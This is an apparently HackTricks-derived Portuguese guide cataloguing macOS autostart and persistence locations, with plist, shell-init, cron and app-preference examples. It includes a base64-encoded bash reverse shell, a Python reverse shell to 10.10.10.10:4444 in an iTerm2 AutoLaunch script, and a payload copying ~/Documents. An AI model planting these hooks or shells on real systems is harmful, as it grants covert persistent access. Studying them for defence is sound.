# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

Esta seção é fortemente baseada na série de blogs [**Além dos bons e velhos LaunchAgents**](https://theevilbit.github.io/beyond/), o objetivo é adicionar **mais Locais de Autostart** (se possível), indicar **quais técnicas ainda estão funcionando** atualmente com a versão mais recente do macOS (13.4) e especificar as **permissões** necessárias.

## Bypass de Sandbox

> [!TIP]
> Aqui você pode encontrar locais de início úteis para **bypass de sandbox** que permitem que você simplesmente execute algo **escrevendo em um arquivo** e **esperando** por uma **ação** muito **comum**, uma **quantidade determinada de tempo** ou uma **ação que você geralmente pode realizar** de dentro de uma sandbox sem precisar de permissões de root.

### Launchd

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Locais

- **`/Library/LaunchAgents`**
- **Gatilho**: Reinicialização
- Root necessário
- **`/Library/LaunchDaemons`**
- **Gatilho**: Reinicialização
- Root necessário
- **`/System/Library/LaunchAgents`**
- **Gatilho**: Reinicialização
- Root necessário
- **`/System/Library/LaunchDaemons`**
- **Gatilho**: Reinicialização
- Root necessário
- **`~/Library/LaunchAgents`**
- **Gatilho**: Re-login
- **`~/Library/LaunchDemons`**
- **Gatilho**: Re-login

> [!TIP]
> Como fato interessante, **`launchd`** tem uma lista de propriedades incorporada na seção Mach-o `__Text.__config` que contém outros serviços bem conhecidos que o launchd deve iniciar. Além disso, esses serviços podem conter `RequireSuccess`, `RequireRun` e `RebootOnSuccess`, o que significa que eles devem ser executados e concluídos com sucesso.
>
> Claro, não pode ser modificado devido à assinatura de código.

#### Descrição & Exploração

**`launchd`** é o **primeiro** **processo** executado pelo kernel do OX S na inicialização e o último a terminar na desligamento. Ele deve sempre ter o **PID 1**. Este processo irá **ler e executar** as configurações indicadas nos **plists** **ASEP** em:

- `/Library/LaunchAgents`: Agentes por usuário instalados pelo administrador
- `/Library/LaunchDaemons`: Daemons em todo o sistema instalados pelo administrador
- `/System/Library/LaunchAgents`: Agentes por usuário fornecidos pela Apple.
- `/System/Library/LaunchDaemons`: Daemons em todo o sistema fornecidos pela Apple.

Quando um usuário faz login, os plists localizados em `/Users/$USER/Library/LaunchAgents` e `/Users/$USER/Library/LaunchDemons` são iniciados com as **permissões dos usuários logados**.

A **principal diferença entre agentes e daemons é que os agentes são carregados quando o usuário faz login e os daemons são carregados na inicialização do sistema** (já que existem serviços como ssh que precisam ser executados antes que qualquer usuário acesse o sistema). Além disso, os agentes podem usar GUI enquanto os daemons precisam ser executados em segundo plano.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Existem casos em que um **agente precisa ser executado antes do login do usuário**, esses são chamados de **PreLoginAgents**. Por exemplo, isso é útil para fornecer tecnologia assistiva no login. Eles também podem ser encontrados em `/Library/LaunchAgents` (veja [**aqui**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) um exemplo).

> [!NOTE]
> Novos arquivos de configuração de Daemons ou Agents serão **carregados após a próxima reinicialização ou usando** `launchctl load <target.plist>`. É **também possível carregar arquivos .plist sem essa extensão** com `launchctl -F <file>` (no entanto, esses arquivos plist não serão carregados automaticamente após a reinicialização).\
> Também é possível **descarregar** com `launchctl unload <target.plist>` (o processo apontado por ele será encerrado),
>
> Para **garantir** que não há **nada** (como uma substituição) **impedindo** um **Agente** ou **Daemon** **de** **executar**, execute: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Liste todos os agentes e daemons carregados pelo usuário atual:
```bash
launchctl list
```
> [!WARNING]
> Se um plist é de propriedade de um usuário, mesmo que esteja em pastas de daemon de sistema, a **tarefa será executada como o usuário** e não como root. Isso pode prevenir alguns ataques de escalonamento de privilégios.

#### Mais informações sobre launchd

**`launchd`** é o **primeiro** processo em modo usuário que é iniciado a partir do **kernel**. O início do processo deve ser **bem-sucedido** e ele **não pode sair ou falhar**. Ele é até mesmo **protegido** contra alguns **sinais de término**.

Uma das primeiras coisas que `launchd` faria é **iniciar** todos os **daemons** como:

- **Daemons de temporizador** baseados em tempo para serem executados:
- atd (`com.apple.atrun.plist`): Tem um `StartInterval` de 30min
- crond (`com.apple.systemstats.daily.plist`): Tem `StartCalendarInterval` para iniciar às 00:15
- **Daemons de rede** como:
- `org.cups.cups-lpd`: Escuta em TCP (`SockType: stream`) com `SockServiceName: printer`
- SockServiceName deve ser uma porta ou um serviço de `/etc/services`
- `com.apple.xscertd.plist`: Escuta em TCP na porta 1640
- **Daemons de caminho** que são executados quando um caminho especificado muda:
- `com.apple.postfix.master`: Verificando o caminho `/etc/postfix/aliases`
- **Daemons de notificações do IOKit**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Porta Mach:**
- `com.apple.xscertd-helper.plist`: Está indicando na entrada `MachServices` o nome `com.apple.xscertd.helper`
- **UserEventAgent:**
- Isso é diferente do anterior. Ele faz com que launchd inicie aplicativos em resposta a eventos específicos. No entanto, neste caso, o binário principal envolvido não é `launchd`, mas `/usr/libexec/UserEventAgent`. Ele carrega plugins da pasta restrita pelo SIP /System/Library/UserEventPlugins/ onde cada plugin indica seu inicializador na chave `XPCEventModuleInitializer` ou, no caso de plugins mais antigos, no dicionário `CFPluginFactories` sob a chave `FB86416D-6164-2070-726F-70735C216EC0` de seu `Info.plist`.

### arquivos de inicialização do shell

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
- Mas você precisa encontrar um aplicativo com um bypass TCC que execute um shell que carregue esses arquivos

#### Localizações

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Gatilho**: Abrir um terminal com zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Gatilho**: Abrir um terminal com zsh
- Root necessário
- **`~/.zlogout`**
- **Gatilho**: Sair de um terminal com zsh
- **`/etc/zlogout`**
- **Gatilho**: Sair de um terminal com zsh
- Root necessário
- Potencialmente mais em: **`man zsh`**
- **`~/.bashrc`**
- **Gatilho**: Abrir um terminal com bash
- `/etc/profile` (não funcionou)
- `~/.profile` (não funcionou)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Gatilho**: Esperado para ser acionado com xterm, mas **não está instalado** e mesmo após a instalação, este erro é gerado: xterm: `DISPLAY is not set`

#### Descrição & Exploração

Ao iniciar um ambiente de shell como `zsh` ou `bash`, **certos arquivos de inicialização são executados**. O macOS atualmente usa `/bin/zsh` como o shell padrão. Este shell é acessado automaticamente quando o aplicativo Terminal é iniciado ou quando um dispositivo é acessado via SSH. Embora `bash` e `sh` também estejam presentes no macOS, eles precisam ser invocados explicitamente para serem usados.

A página de manual do zsh, que podemos ler com **`man zsh`**, tem uma longa descrição dos arquivos de inicialização.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Aplicativos Reabertos

> [!CAUTION]
> Configurar a exploração indicada e sair e entrar novamente ou até reiniciar não funcionou para mim para executar o aplicativo. (O aplicativo não estava sendo executado, talvez precise estar em execução quando essas ações forem realizadas)

**Escrita**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Gatilho**: Reiniciar reabrindo aplicativos

#### Descrição & Exploração

Todos os aplicativos a serem reabertos estão dentro do plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Portanto, para fazer os aplicativos reabertos lançarem o seu, você só precisa **adicionar seu aplicativo à lista**.

O UUID pode ser encontrado listando esse diretório ou com `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Para verificar os aplicativos que serão reabertos, você pode fazer:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Para **adicionar um aplicativo a esta lista** você pode usar:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Preferências do Terminal

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
- Contorno do TCC: [✅](https://emojipedia.org/check-mark-button)
- O uso do Terminal para ter permissões FDA do usuário que o utiliza

#### Localização

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Gatilho**: Abrir o Terminal

#### Descrição & Exploração

Em **`~/Library/Preferences`** estão armazenadas as preferências do usuário nos Aplicativos. Algumas dessas preferências podem conter uma configuração para **executar outros aplicativos/scripts**.

Por exemplo, o Terminal pode executar um comando na Inicialização:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Essa configuração é refletida no arquivo **`~/Library/Preferences/com.apple.Terminal.plist`** assim:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Então, se o plist das preferências do terminal no sistema puder ser sobrescrito, a funcionalidade **`open`** pode ser usada para **abrir o terminal e esse comando será executado**.

Você pode adicionar isso a partir da linha de comando com:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Outras extensões de arquivo

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
- Contorno TCC: [✅](https://emojipedia.org/check-mark-button)
- O uso do Terminal para ter permissões FDA do usuário que o utiliza

#### Localização

- **Qualquer lugar**
- **Gatilho**: Abrir o Terminal

#### Descrição & Exploração

Se você criar um [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) e abri-lo, o **aplicativo Terminal** será automaticamente invocado para executar os comandos indicados nele. Se o aplicativo Terminal tiver alguns privilégios especiais (como TCC), seu comando será executado com esses privilégios especiais.

Experimente com:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Você também pode usar as extensões **`.command`**, **`.tool`**, com conteúdo de scripts de shell regulares e eles também serão abertos pelo Terminal.

> [!CAUTION]
> Se o terminal tiver **Acesso Total ao Disco**, ele poderá completar essa ação (note que o comando executado será visível em uma janela do terminal).

### Plugins de Áudio

Escrita: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Escrita: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Você pode obter algum acesso extra ao TCC

#### Localização

- **`/Library/Audio/Plug-Ins/HAL`**
- Root necessário
- **Gatilho**: Reiniciar coreaudiod ou o computador
- **`/Library/Audio/Plug-ins/Components`**
- Root necessário
- **Gatilho**: Reiniciar coreaudiod ou o computador
- **`~/Library/Audio/Plug-ins/Components`**
- **Gatilho**: Reiniciar coreaudiod ou o computador
- **`/System/Library/Components`**
- Root necessário
- **Gatilho**: Reiniciar coreaudiod ou o computador

#### Descrição

De acordo com as escritas anteriores, é possível **compilar alguns plugins de áudio** e carregá-los.

### Plugins QuickLook

Escrita: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Você pode obter algum acesso extra ao TCC

#### Localização

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Descrição & Exploração

Plugins QuickLook podem ser executados quando você **aciona a pré-visualização de um arquivo** (pressione a barra de espaço com o arquivo selecionado no Finder) e um **plugin que suporta esse tipo de arquivo** está instalado.

É possível compilar seu próprio plugin QuickLook, colocá-lo em uma das localizações anteriores para carregá-lo e, em seguida, ir para um arquivo suportado e pressionar espaço para acioná-lo.

### ~~Hooks de Login/Logout~~

> [!CAUTION]
> Isso não funcionou para mim, nem com o LoginHook do usuário nem com o LogoutHook do root

**Escrita**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- Você precisa ser capaz de executar algo como `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- `Lo`cado em `~/Library/Preferences/com.apple.loginwindow.plist`

Eles estão obsoletos, mas podem ser usados para executar comandos quando um usuário faz login.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Esta configuração é armazenada em `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Para deletá-lo:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
O usuário root é armazenado em **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Bypass Condicional de Sandbox

> [!TIP]
> Aqui você pode encontrar locais de início úteis para **bypass de sandbox** que permitem que você simplesmente execute algo **escrevendo em um arquivo** e **esperando condições não tão comuns** como **programas específicos instalados, ações de usuário "não comuns"** ou ambientes.

### Cron

**Escrita**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Útil para contornar a sandbox: [✅](https://emojipedia.org/check-mark-button)
- No entanto, você precisa ser capaz de executar o binário `crontab`
- Ou ser root
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Root necessário para acesso de gravação direto. Não é necessário root se você puder executar `crontab <file>`
- **Gatilho**: Depende do trabalho cron

#### Descrição & Exploração

Liste os trabalhos cron do **usuário atual** com:
```bash
crontab -l
```
Você também pode ver todos os cron jobs dos usuários em **`/usr/lib/cron/tabs/`** e **`/var/at/tabs/`** (necessita de root).

No MacOS, várias pastas executando scripts com **certa frequência** podem ser encontradas em:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Lá você pode encontrar os **cron** **jobs** regulares, os **at** **jobs** (não muito utilizados) e os **periodic** **jobs** (principalmente usados para limpar arquivos temporários). Os jobs periódicos diários podem ser executados, por exemplo, com: `periodic daily`.

Para adicionar um **user cronjob programaticamente**, é possível usar:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
- Contorno de TCC: [✅](https://emojipedia.org/check-mark-button)
- O iTerm2 costumava ter permissões de TCC concedidas

#### Localizações

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Gatilho**: Abrir iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Gatilho**: Abrir iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Gatilho**: Abrir iTerm

#### Descrição & Exploração

Scripts armazenados em **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** serão executados. Por exemplo:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
ou:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
O script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** também será executado:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
As preferências do iTerm2 localizadas em **`~/Library/Preferences/com.googlecode.iterm2.plist`** podem **indicar um comando a ser executado** quando o terminal iTerm2 é aberto.

Essa configuração pode ser ajustada nas configurações do iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

E o comando é refletido nas preferências:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Você pode definir o comando a ser executado com:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Altamente provável que existam **outras maneiras de abusar das preferências do iTerm2** para executar comandos arbitrários.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mas o xbar deve estar instalado
- Bypass do TCC: [✅](https://emojipedia.org/check-mark-button)
- Solicita permissões de Acessibilidade

#### Localização

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Gatilho**: Uma vez que o xbar é executado

#### Descrição

Se o popular programa [**xbar**](https://github.com/matryer/xbar) estiver instalado, é possível escrever um script shell em **`~/Library/Application\ Support/xbar/plugins/`** que será executado quando o xbar for iniciado:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Escrita**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mas o Hammerspoon deve estar instalado
- Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
- Ele solicita permissões de Acessibilidade

#### Localização

- **`~/.hammerspoon/init.lua`**
- **Gatilho**: Uma vez que o hammerspoon é executado

#### Descrição

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) serve como uma plataforma de automação para **macOS**, aproveitando a **linguagem de script LUA** para suas operações. Notavelmente, suporta a integração de código AppleScript completo e a execução de scripts de shell, aprimorando significativamente suas capacidades de script.

O aplicativo procura um único arquivo, `~/.hammerspoon/init.lua`, e quando iniciado, o script será executado.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mas o BetterTouchTool deve ser instalado
- Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
- Ele solicita permissões de Automação-Curtas e Acessibilidade

#### Localização

- `~/Library/Application Support/BetterTouchTool/*`

Esta ferramenta permite indicar aplicativos ou scripts a serem executados quando alguns atalhos são pressionados. Um atacante pode ser capaz de configurar seu próprio **atalho e ação a serem executados no banco de dados** para fazer com que ele execute código arbitrário (um atalho poderia ser apenas pressionar uma tecla).

### Alfred

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mas o Alfred deve ser instalado
- Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
- Ele solicita permissões de Automação, Acessibilidade e até mesmo Acesso Completo ao Disco

#### Localização

- `???`

Permite criar fluxos de trabalho que podem executar código quando certas condições são atendidas. Potencialmente, é possível para um atacante criar um arquivo de fluxo de trabalho e fazer o Alfred carregá-lo (é necessário pagar pela versão premium para usar fluxos de trabalho).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mas o ssh precisa estar habilitado e em uso
- Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
- O uso do SSH deve ter acesso FDA

#### Localização

- **`~/.ssh/rc`**
- **Gatilho**: Login via ssh
- **`/etc/ssh/sshrc`**
- Requer root
- **Gatilho**: Login via ssh

> [!CAUTION]
> Para ativar o ssh requer Acesso Completo ao Disco:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Descrição & Exploração

Por padrão, a menos que `PermitUserRC no` em `/etc/ssh/sshd_config`, quando um usuário **faz login via SSH**, os scripts **`/etc/ssh/sshrc`** e **`~/.ssh/rc`** serão executados.

### **Itens de Login**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mas você precisa executar `osascript` com args
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localizações

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Gatilho:** Login
- Payload de exploração armazenado chamando **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Gatilho:** Login
- Requer root

#### Descrição

Em Preferências do Sistema -> Usuários e Grupos -> **Itens de Login** você pode encontrar **itens a serem executados quando o usuário faz login**.\
É possível listá-los, adicionar e remover pela linha de comando:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Esses itens são armazenados no arquivo **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

Os **itens de login** também podem ser indicados usando a API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc), que armazenará a configuração em **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP como Item de Login

(Consulte a seção anterior sobre Itens de Login, esta é uma extensão)

Se você armazenar um arquivo **ZIP** como um **Item de Login**, o **`Archive Utility`** o abrirá e, se o zip foi, por exemplo, armazenado em **`~/Library`** e continha a pasta **`LaunchAgents/file.plist`** com um backdoor, essa pasta será criada (não é criada por padrão) e o plist será adicionado, de modo que na próxima vez que o usuário fizer login novamente, o **backdoor indicado no plist será executado**.

Outra opção seria criar os arquivos **`.bash_profile`** e **`.zshenv** dentro do HOME do usuário, para que, se a pasta LaunchAgents já existir, essa técnica ainda funcione.

### At

Escrita: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Útil para contornar sandbox: [✅](https://emojipedia.org/check-mark-button)
- Mas você precisa **executar** **`at`** e ele deve estar **habilitado**
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- Necessita **executar** **`at`** e deve estar **habilitado**

#### **Descrição**

As tarefas `at` são projetadas para **agendar tarefas únicas** a serem executadas em determinados momentos. Ao contrário dos trabalhos cron, as tarefas `at` são automaticamente removidas após a execução. É crucial notar que essas tarefas são persistentes entre reinicializações do sistema, marcando-as como potenciais preocupações de segurança sob certas condições.

Por **padrão**, elas estão **desativadas**, mas o usuário **root** pode **habilitá-las** com:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Isso criará um arquivo em 1 hora:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Verifique a fila de trabalhos usando `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Acima, podemos ver dois trabalhos agendados. Podemos imprimir os detalhes do trabalho usando `at -c JOBNUMBER`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Se as tarefas AT não estiverem habilitadas, as tarefas criadas não serão executadas.

Os **arquivos de trabalho** podem ser encontrados em `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
O nome do arquivo contém a fila, o número do trabalho e o horário em que está agendado para ser executado. Por exemplo, vamos dar uma olhada em `a0001a019bdcd2`.

- `a` - esta é a fila
- `0001a` - número do trabalho em hex, `0x1a = 26`
- `019bdcd2` - tempo em hex. Representa os minutos passados desde a época. `0x019bdcd2` é `26991826` em decimal. Se multiplicarmos por 60, obtemos `1619509560`, que é `GMT: 27 de abril de 2021, terça-feira 7:46:00`.

Se imprimirmos o arquivo do trabalho, descobrimos que contém as mesmas informações que obtivemos usando `at -c`.

### Ações de Pasta

